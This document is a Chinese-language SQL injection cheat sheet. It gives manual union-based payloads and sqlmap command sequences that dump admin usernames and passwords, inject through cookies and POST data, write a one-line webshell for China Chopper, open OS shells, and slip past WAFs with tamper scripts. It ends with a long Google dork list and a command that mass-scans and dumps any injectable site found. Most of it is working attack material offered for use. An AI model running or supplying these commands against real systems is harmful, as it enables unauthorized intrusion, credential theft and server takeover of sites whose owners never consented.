# Sqlmap
## 测试注入

在表单中注入：先随便注册个用户名，如aaa
测试：
aaa' and 1=1 -- //登录后台
aaa' and 1=2 -- //报错

aaa' and exists(select * from admin) -- //猜表名

aaa' and exists(select password from admin)-- //猜字段名

aaa' and (select top 1 len(name) from admin)>n //猜第一类name字段内容长度 

aaa' and (select top 1 ascii(substring(name,1,1))) from admin)>n //猜解指定字符的ascii码

aaa' and (select name from master.dbo.sysdatabases)

### 手工流程
1.测试注入点
非正常
http://192.168.65.151:8000/show.php?id=34'
返回
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1

正常
http://192.168.65.151:8000/show.php?id=34 and 1=1

2.测试列数
http://192.168.65.151:8000/show.php?id=34 order by 15

小于列数时会正常显示，大于列数时返回:Unknown column '151' in 'order clause'
http://192.168.65.151:8000/show.php?id=34 order by 151

3.查询可显示的字段
http://192.168.65.151:8000/show.php?id=34 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15

发生错误时返回：The used SELECT statements have a different number of columns
http://192.168.65.151:8000/show.php?id=34 and 1=2 union select 1
http://192.168.65.151:8000/show.php?id=34 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16

4. 获取基本信息(当前数据库名)
http://192.168.65.151:8000/show.php?id=34 and 1=2 union select 1,2,concat(user(),0x20,0x20,database(),0x20,0x20,version()),4,5,6,7,8,9,10,11,12,13,14,15

5. 猜解表名
http://192.168.65.151:8000/show.php?id=34 and exists(select * from cms_users)

http://192.168.65.151:8000/show.php?id=34 and exists(select * from user)
猜解失败会返回：Table 'cms.user' doesn't exist

6. 猜解列名
http://192.168.65.151:8000/show.php?id=34 and exists(select userid,username,password from cms_users)

http://192.168.65.151:8000/show.php?id=34 and exists(select userid,username,password2 from cms_users)
失败会返回：Unknown column 'password2' in 'field list'

7. 抓数据

http://192.168.65.151:8000/show.php?id=34 and 1=2 union select 1,2,concat(username,0x3a,password),4,5,6,7,8,9,10,11,12,13,14,15 from cms_users

http://192.168.65.151:8000/show.php?id=34 and 1=2 union select 1,2,concat(username,0x3a,password),4,5,6,7,8,9,10,11,12,13,14,15 from cms_users where userid=2 


## 注入过程举例
1.判断注入点，获取网站信息
`sqlmap.py -u http://www.xx.com/ss.asp?id=123`
例：
sqlmap.py -u "http://www.xx.com/ss.asp?id=123"
2.获取所有数据库    access 没有数据库这一步不用做
`sqlmap.py -u http://www.xx.com/ss.asp?id=123 --dbs`
例：
sqlmap.py -u "http://www.xx.com/ss.asp?id=123" --dbs
3.获取网站当前所使用的数据库
`sqlmap.py -u http://www.xx.com/ss.asp?id=123 --current-db`
例:
sqlmap.py -u "http://www.xx.com/ss.asp?id=123" --current-db
4.获取数据库中的表名
`sqlmap.py -u http://www.xx.com/ss.asp?id=123 -D 数据库名 --tables`
例：
sqlmap.py -u "http://www.xx.com/ss.asp?id=123" -D news2008 --tables
5.获取数据表中的字段名
`sqlmap.py -u http://www.xx.com/ss.asp?id=123 -D 数据库名 -T 表名 --columns`
例：
sqlmap.py -u "http://www.xx.com/ss.asp?id=123" -D news2008 -T admin --columns
6.获取字段中的内容
`sqlmap.py -u http://www.xx.com/ss.asp?id=123 -D 数据库名 -T 表名 -C "字段名1,字段名2..." --dump`
例：
sqlmap.py -u "http://www.xx.com/ss.asp?id=123" -D news2008 -T admin -C "username,psw" --dump


## 常用注入方式
### access:： 
--url="http://127.0.0.1/CompHonorBig.asp?id=7" --tables        列表 
--url="http://127.0.0.1/CompHonorBig.asp?id=7" --columns -T admin   字段 
--url="http://127.0.0.1/CompHonorBig.asp?id=7" --dump -T admin -C "username,password"  内容 

### mysql： 
--url="http://127.0.0.1/link.php?id=321" --dbs 
--url="http://127.0.0.1/link.php?id=321" --tables -D myDB 
--url="http://127.0.0.1/link.php?id=321" --columns -D myDB -T admin 
--url="http://127.0.0.1/link.php?id=321" --dump -C "username,password" -T admin -D myDB

### cookies注入： 
--url="http://127.0.0.1/DownloadShow.asp" --level=2 --cookie="id=9" --tables 
--url="http://127.0.0.1/DownloadShow.asp" --level=2 --cookie="id=9" --tables --columns -T admin 
--url="http://127.0.0.1/DownloadShow.asp" --level=2 --cookie="id=9" --dump -T admin -C "username,password" 
--cookie=""   用于需要认证的页面，不加cookie会被重定向
```
sqlmap.py -u "http://192.168.100.72/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#"  --dbs  --cookie="security=low;PHPSESSION=19b96af7fa39178651c11436de5aa56d"

```
### post登录框： 
--url="http://127.0.0.1/Login.asp" --forms    自动搜 
--url="http://127.0.0.1/Login.asp" --data="tfUName=1&tfUPass=1"     指定项 

### 执行命令： 
--url="http://127.0.0.1/new.php?id=  1" --os-cmd=ipconfig    类型    指定网站根目录 
--url="http://127.0.0.1/new.php?id=1" --os-shell         可能是tmpuoiuz.php 

### 伪静态： 
--url="http://127.0.0.1/xxx*/12345.jhtml" --dbs                  *指定地方 
--url="http://127.0.0.1/xxx*/12345.jhtml" --tables -D xxxxxx               表 
--url="http://127.0.0.1/xxx*/12345.jhtml" --columns -D xxxxxx -T admin     字段 
--url="http://127.0.0.1/xxx*/12345.jhtml" --dump -D xxxxxx -T admin -C "username,password" 

1.在存在注入的地方加上*,然后获取数据库
sqlmap.py -u "http://www.xx.com/index.php/index/view/id/40*.html" --dbs
2.获取数据库中的表
sqlmap.py -u "http://www.xx.com/index.php/index/view/id/40*.html" -D 数据库名 --tables
3.获取数据库中的字段
sqlmap.py -u "http://www.xx.com/index.php/index/view/id/40*.html" -D 数据库名 -T 表名 --columns
4.获取字段的内容
sqlmap.py -u "http://www.xx.com/index.php/index/view/id/40*.html" -D 数据库名 -T 表名 -C "字段名1,字段名2" --dump


### 请求延时： 
--url="http://127.0.0.1/Index/view/id/40.html" --delay=2 
--url="http://127.0.0.1/Index/view/id/40.html" --safe-freq=5 

参数一：--delay 1(1秒)   表示延时1秒进行注入，1可根据自己情况更改
sqlmap.py -u "http://www.xx.com/index.php/index/view/id/40*.html" --delay 1(1是时间，1秒，自己设置)
例：
sqlmap.py -u "http://www.xx.com/index.php/index/view/id/40*.html" --delay 1

参数二：-safe-freq   提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。
sqlmap.py -u "http://www.xx.com/index.php/index/view/id/40*.html" -safe-freq 20(20为次数，自己设定)
例：
sqlmap.py -u "http://www.xx.com/index.php/index/view/id/40*.html" -safe-freq 3
### 导出所有数据:
--dump-all

### 指定参数文件和注入点
`./sqlmap.py -r search-test.txt -p tfUPass`
参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p  指定注入用的参数,利用burpsuite抓包保存为.txt，利用sqlmap指定文本注入



## --file 参数
权限：必须为dba权限

**file-write	从本地写入**
**file-dest	写入目标路径**

判断是否是dba权限(显示TRUE或者FALSE，TRUE即为dba权限，反之不是)

`sqlmap.py -u "http://www.xx.com/aa.aspx?id=123" --is-dba`

写入文件至站点目录

`sqlmap.py -u "http://www.xx.com/aa.aspx?id=123" --file-write=本地文件路径 --file-dest 网站路径(写入路径)+"/写入的文件名"`

`sqlmap.py -u "http://www.xx.com/aa.aspx?id=123" --file-write=F:/a.aspx --file-dest D:/虚拟目录/Front/cx.aspx`

D:/虚拟目录/Front   为网站的物理路径

写入成功后，即可通过浏览器访问，若为一句话木马则可使用中国菜刀进行连接。注：网站路径必须为网站的真实物理路径(即绝对路径。也就是从盘符开始的路径)，否则无法写入数据。
## SQLMAP渗透笔记之交互写shell及命令执行(即os参数的使用)

1.执行系统命令(windows系统)： --os-cmd=ipconfig
sqlmap.py -u "http://www.xx.com/aa.aspx?id=123" --os-cmd=ipconfig

执行后根据提示选择网站语言，然后回车，指定目标站点根目录，然后继续回车即可完整执行命令

2.执行shell： --os-shell
sqlmap.py -u "http://www.xx.com/aa.aspx?id=123" --os-shell

执行后根据提示选择网站语言，然后回车，指定目标站点根目录后回车，输入命令即可执行，也可起到提权的作用。执行命令后会在网站根目录生成两个临时文件：tmpbxbxz.php   tmpuoiuz.php(此文件为上传页面)
注意：需要有足够大的权限方可执行命令
查看网站权限
sqlmap.py -u "http://www.xx.com/aa.aspx?id=123" --privileg

## 绕过waf：
此方法适用于在注入的时候出现频繁报错时或者可以确定网站有注入点的时候。
batch：要求不对目标写入
tamper：使用干预脚本
-v 3(3为等级)   --level=3 

注意：若不使用3等级无法继续下一步操作。
```
sqlmap.py -u "http://www.xx.com/a.asp?id=123" -v 3 --dbs  --batch --tamper "space2morehash.py"
sqlmap.py --url="http://127.0.0.1/new.php?id=1"  --level=3 --batch --dbs --tamper space2morehash.py
```
### SQLMAP tamper WAF 绕过脚本列表注释
01. apostrophemask.py        用UTF-8全角字符替换单引号字符
02. apostrophenullencode.py        用非法双字节unicode字符替换单引号字符
03. appendnullbyte.py        在payload末尾添加空字符编码
04. base64encode.py        对给定的payload全部字符使用Base64编码
05. between.py        分别用“NOT BETWEEN 0 AND #”替换大于号“>”，“BETWEEN # AND #”替换等于号“=”
06. bluecoat.py        在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”
07. chardoubleencode.py        对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）
08. charencode.py        对给定的payload全部字符使用URL编码（不处理已经编码的字符）
09. charunicodeencode.py        对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）
10. concat2concatws.py        用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例
11. equaltolike.py        用“LIKE”运算符替换全部等于号“=”
12. greatest.py        用“GREATEST”函数替换大于号“>”
13. halfversionedmorekeywords.py        在每个关键字之前添加MySQL注释
14. ifnull2ifisnull.py        用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例
15. lowercase.py        用小写值替换每个关键字字符
16. modsecurityversioned.py        用注释包围完整的查询
17. modsecurityzeroversioned.py        用当中带有数字零的注释包围完整的查询
18. multiplespaces.py        在SQL关键字周围添加多个空格
19. nonrecursivereplacement.py        用representations替换预定义SQL关键字，适用于过滤器
20. overlongutf8.py        转换给定的payload当中的所有字符
21. percentage.py        在每个字符之前添加一个百分号
22. randomcase.py        随机转换每个关键字字符的大小写
23. randomcomments.py        向SQL关键字中插入随机注释
24. securesphere.py        添加经过特殊构造的字符串
25. sp_password.py        向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs
26. space2comment.py        用“/**/”替换空格符
27. space2dash.py        用破折号注释符“--”其次是一个随机字符串和一个换行符替换空格符
28. space2hash.py        用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符
29. space2morehash.py        用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符
30. space2mssqlblank.py        用一组有效的备选字符集当中的随机空白符替换空格符
31. space2mssqlhash.py        用磅注释符“#”其次是一个换行符替换空格符
32. space2mysqlblank.py        用一组有效的备选字符集当中的随机空白符替换空格符
33. space2mysqldash.py        用破折号注释符“--”其次是一个换行符替换空格符
34. space2plus.py        用加号“+”替换空格符
35. space2randomblank.py        用一组有效的备选字符集当中的随机空白符替换空格符
36. unionalltounion.py        用“UNION SELECT”替换“UNION ALL SELECT”
37. unmagicquotes.py        用一个多字节组合%bf%27和末尾通用注释一起替换空格符 宽字节注入
38. varnish.py        添加一个HTTP头“X-originating-IP”来绕过WAF
39. versionedkeywords.py        用MySQL注释包围每个非函数关键字
40. versionedmorekeywords.py        用MySQL注释包围每个关键字
41. xforwardedfor.py        添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF

## SQLMAP渗透笔记之Google Hack
利用Google Dorks字符串找到可注入的网站
sqlmap.py -g(g即为谷歌的意思) 加上搜索引擎的语言(即google关键字)
使用示例：
1. sqlmap.py -g "inurl:php?id="
2. sqlmap.py -g "inurl:php?id=" --dump-all --batch
                                                google搜索注入点 自动跑出所有字段

**部分关键字(根据自己需要的去使用)：**
inurl:item_id=	
inurl:review.php?id=	
inurl:hosting_info.php?id=
inurl:newsid=	
inurl:iniziativa.php?in=	
inurl:gallery.php?id=
inurl:trainers.php?id=	
inurl:curriculum.php?id=	
inurl:rub.php?idr=
inurl:news-full.php?id=	
inurl:labels.php?id=	
inurl:view_faq.php?id=
inurl:news_display.php?getid=	
inurl:story.php?id=	
inurl:artikelinfo.php?id=
inurl:index2.php?option=	
inurl:look.php?ID=	
inurl:detail.php?ID=
inurl:readnews.php?id=	
inurl:newsone.php?id=	
inurl:index.php?=
inurl:top10.php?cat=	
inurl:aboutbook.php?id=	
inurl:profile_view.php?id=
inurl:newsone.php?id=	
inurl:material.php?id=	
inurl:category.php?id=
inurl:event.php?id=	
inurl:opinions.php?id=	
inurl:publications.php?id=
inurl:product-item.php?id=	
inurl:announce.php?id=	
inurl:fellows.php?id=
inurl:sql.php?id=	
inurl:rub.php?idr=	
inurl:downloads_info.php?id=
inurl:index.php?catid=	
inurl:galeri_info.php?l=	
inurl:prod_info.php?id=
inurl:news.php?catid=	
inurl:tekst.php?idt=	
inurl:shop.php?do=part&id=
inurl:index.php?id=	
inurl:newscat.php?id=	
inurl:productinfo.php?id=
inurl:news.php?id=	
inurl:newsticker_info.php?idn=	
inurl:collectionitem.php?id=
inurl:index.php?id=	
inurl:rubrika.php?idr=	
inurl:band_info.php?id=
inurl:trainers.php?id=	
inurl:rubp.php?idr=	
inurl:product.php?id=
inurl:buy.php?category=	
inurl:offer.php?idf=	
inurl:releases.php?id=
inurl:article.php?ID=	
inurl:art.php?idm=	
inurl:ray.php?id=
inurl:play_old.php?id=	
inurl:title.php?id=	
inurl:produit.php?id=
inurl:declaration_more.php?decl_id=	
inurl:news_view.php?id=	
inurl:pop.php?id=
inurl:pageid=	
inurl:select_biblio.php?id=	
inurl:shopping.php?id=
inurl:games.php?id=	
inurl:humor.php?id=	
inurl:productdetail.php?id=
inurl:page.php?file=	
inurl:aboutbook.php?id=	
inurl:post.php?id=
inurl:newsDetail.php?id=	
inurl:ogl_inet.php?ogl_id=	
inurl:viewshowdetail.php?id=
inurl:gallery.php?id=	
inurl:fiche_spectacle.php?id=	
inurl:clubpage.php?id=
inurl:article.php?id=	
inurl:communique_detail.php?id=	
inurl:memberInfo.php?id=
inurl:show.php?id=	
inurl:sem.php3?id=	
inurl:section.php?id=
inurl:staff_id=	
inurl:kategorie.php4?id=	
inurl:theme.php?id=
inurl:newsitem.php?num=	
inurl:news.php?id=	
inurl:page.php?id=
inurl:readnews.php?id=	
inurl:index.php?id=	
inurl:shredder-categories.php?id=
inurl:top10.php?cat=	
inurl:faq2.php?id=	
inurl:tradeCategory.php?id=
inurl:historialeer.php?num=	
inurl:show_an.php?id=	
inurl:product_ranges_view.php?ID=
inurl:reagir.php?num=	
inurl:preview.php?id=	
inurl:shop_category.php?id=
inurl:Stray-Questions-View.php?num=	
inurl:loadpsb.php?id=	
inurl:transcript.php?id=
inurl:forum_bds.php?num=	
inurl:opinions.php?id=	
inurl:channel_id=
inurl:game.php?id=	
inurl:spr.php?id=	
inurl:aboutbook.php?id=
inurl:view_product.php?id=	
inurl:pages.php?id=	
inurl:preview.php?id=
inurl:newsone.php?id=	
inurl:announce.php?id=	
inurl:loadpsb.php?id=
inurl:sw_comment.php?id=	
inurl:clanek.php4?id=	
inurl:pages.php?id=
inurl:news.php?id=	
inurl:participant.php?id=	 
inurl:avd_start.php?avd=	
inurl:download.php?id=	 
inurl:event.php?id=	
inurl:main.php?id=	 
inurl:product-item.php?id=	
inurl:review.php?id=	 
inurl:sql.php?id=	
inurl:chappies.php?id=	 
inurl:material.php?id=	
inurl:read.php?id=	 
inurl:clanek.php4?id=	
inurl:prod_detail.php?id=	 
inurl:announce.php?id=	
inurl:viewphoto.php?id=	 
inurl:chappies.php?id=	
inurl:article.php?id=	 
inurl:read.php?id=	
inurl:person.php?id=	 
inurl:viewapp.php?id=	
inurl:productinfo.php?id=	 
inurl:viewphoto.php?id=	
inurl:showimg.php?id=	 
inurl:rub.php?idr=	
inurl:view.php?id=	 
inurl:galeri_info.php?l=	
inurl:website.php?id=	 